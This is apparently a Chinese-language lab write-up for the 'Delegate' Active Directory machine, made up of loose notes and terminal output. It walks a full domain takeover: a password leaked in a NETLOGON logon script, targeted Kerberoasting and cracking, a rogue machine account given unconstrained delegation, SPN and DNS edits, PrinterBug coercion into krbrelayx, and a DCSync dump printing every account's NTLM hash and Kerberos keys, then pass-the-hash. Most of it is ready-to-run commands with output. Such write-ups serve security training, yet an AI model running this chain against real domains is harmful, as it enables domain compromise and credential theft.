---
title: Delegate
weight: 724
tags:
  - windows
  - medium
  - winrm
  - kud
  - targeted-kerberoasting
---

## 00. 摘要

> 关键词：信息泄露、ASREProast、LDAP侦察、Shadow Credentials、Kerberos Relay

1. 信息收集：端口扫描发现开放SMB服务，然后使用 `Guest` 账户枚举 SMB 服务
	1. 得到 `A.Briggs` 账户
2. 信息收集：bloodhound
	1. `A.Briggs` -- GenericWrite -> `N.Thompson` -- CanPSRemote -> `DC1$`
	2. Targeted Kerberoasting 得到 `N.Thompson` 账户
3. 信息收集：`whoami /priv`，发现一个特殊权限
	1. SeEnableDelegationPrivilege -> 可以对指定机器启用非约束性委派
4. 非约束性委派攻击拿到 `DC1$`
5. DCSync拿到 `Administrator`



delegate.vl\A.Briggs:P4ssw0rd1#123

python3 ~/my_data/Tools/targetedKerberoast/targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'

john cred.txt --wordlist=/usr/share/wordlists/rockyou.txt

delegate.vl\N.Thompson:KALEB_2341

SeMachineAccountPrivilege -> create Machine
SeEnableDelegationPrivilege -> Enable Unconstrained Delegation on a Machine

```
$ netexec smb 10.129.174.10 -u "Guest" -p "" --shares

$ impacket-smbclient Guest@10.129.174.10 -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# use NETLOGON
# tree
/users.bat
Finished - 0 files and folders
# cat users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123


```

```bash
# 添加机器账户
impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' -dc-ip 10.129.174.10 'delegate.vl'/'N.Thompson':'KALEB_2341'

bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION

# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/DELEGATE.delegate.vl' -t 'DELEGATE$' -dc-ip 10.129.234.69 dc1.delegate.vl --additional

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/DELEGATE.delegate.vl' -t 'DELEGATE$' -dc-ip 10.129.234.69 dc1.delegate.vl


# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'delegate.vl\DELEGATE$' -p 'Password123!' --action add --record DELEGATE.delegate.vl --data 10.10.14.13 --type A -dns-ip 10.129.234.69 dc1.delegate.vl

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup DELEGATE.delegate.vl 10.129.234.69

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
krbrelayx.py --krbsalt 'DELEGATE.VLhost/delegate.delegate.vl' --krbpass 'Password123!'

DELEGATE.VLhost/delegate.delegate.vl

# 5. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

printerbug.py delegate.vl/'N.Thompson':'KALEB_2341'@'dc1.delegate.vl' 'DELEGATE.delegate.vl'

```





evil-winrm -u "N.Thompson" -p 'KALEB_2341' -i 10.129.129.92


impacket-psexec 'delegate.vl'/'N.Thompson':'KALEB_2341'@'10.129.166.163'



impacket-getTGT -dc-ip "10.129.129.92" 'delegate.vl'/'DELEGATE$':'Password123!'

export KRB5CCNAME="DELEGATE$.ccache"

impacket-getST -impersonate "Administrator" -spn cifs/DC1.delegate.vl -k -no-pass -dc-ip "10.129.129.92" 'delegate.vl'/'DELEGATE$'




combine ... boom!

1. impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' -dc-ip 10.129.129.92 'delegate.vl'/'N.Thompson':'KALEB_2341'

# 获取计算机对象
$computer = Get-ADComputer -Identity 'DELEGATE$'
# 启用非约束性委派
Set-ADAccountControl -Identity $computer -TrustedForDelegation $true

or `bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION`



```
$ impacket-findDelegation 'delegate.vl'/'N.Thompson':'KALEB_2341'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType  DelegationRightsTo 
-----------  -----------  --------------  ------------------
DELEGATE$    Computer     Unconstrained   N/A
```








impacket-secretsdump -k 'delegate.vl'/'DC1$'@'dc1.delegate.vl' -no-pass

```
┌─[sg-dedivip-1]─[10.10.14.13]─[lambermaybe@htb-whajtrkjwf]─[~/my_data/Machines/Delegate]
└──╼ [★]$ impacket-secretsdump -k 'delegate.vl'/'DC1$'@'dc1.delegate.vl' -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::


impacket-psexec 'Administrator@delegate.vl' -hashes aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
DELEGATE$:4601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
krbtgt:des-cbc-md5:ef491c5b736bd04c
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
DELEGATE$:aes256-cts-hmac-sha1-96:e046a58d1ef38554e96c89357202d5a8735f50971b91aa803b1b8cb3adccc744
DELEGATE$:aes128-cts-hmac-sha1-96:3633f49c0af4aa1c87ce5c81d259b99b
DELEGATE$:des-cbc-md5:cdc297251673a86e
[*] Cleaning up... 
```